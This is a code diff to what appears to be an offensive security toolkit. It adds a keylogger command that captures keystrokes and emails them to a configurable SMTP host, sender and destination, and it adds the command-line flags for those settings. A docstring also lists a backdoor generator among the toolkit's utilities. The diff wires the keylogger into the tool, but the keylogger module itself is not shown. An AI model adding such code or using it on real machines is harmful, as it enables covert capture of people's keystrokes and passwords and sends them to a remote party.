@@ -718,6 +718,40 @@ def open_redirect(args):
             LOGGER.error(e)
             sys.exit(1)
 
+"""
+>> utilities functions goes here
+
+Traversal : - utilities
+                - backdoor_generator
+                - data_monitor
+                - extract_sitemap
+                - keylogger
+                - mac-changer
+                - ssh_tunnel
+                - trace_route
+"""
+
+
+def keylogger(args):
+    try:
+        colors.info('Keylogger starting...')
+
+        from lib.utilities.keylogger import keylogger
+
+        keyloggerObj = keylogger.Keylogger(interval=args.interval,
+                                           sender=args.sender,
+                                           destination=args.destination,
+                                           host=args.host, port=args.port,
+                                           username=args.username,
+                                           password=args.password)
+        keyloggerObj.start_keylogger()
+
+    except ImportError:
+        colors.error('Could not import the required module.')
+        LOGGER.error('[-] Could not import the required module.')
+    except Exception as e:
+        LOGGER.error(e)
+
 
 if __name__ == '__main__':
 
@@ -791,6 +825,13 @@ if __name__ == '__main__':
                         help='Find admin panel on a given domain')
     parser.add_argument('-orv', action='store_true',
                         help='Test for open redirection Vulnerability')
+    parser.add_argument('-keylogger', action='store_true',
+                        help='Capture keystrokes and send them by email')
+    parser.add_argument('-host', help='SMTP Host to use')
+    parser.add_argument('-username', help='Username to login')
+    parser.add_argument('-password', help='Password to login')
+    parser.add_argument('-sender', help='Email to send from')
+    parser.add_argument('-destination', help='Email to send to')
 
     colors.info("Please Check log file for information about any errors")
 
@@ -904,3 +945,6 @@ if __name__ == '__main__':
 
     if args.arp:
         arp_scan(args)
+
+    if args.keylogger:
+        keylogger(args)
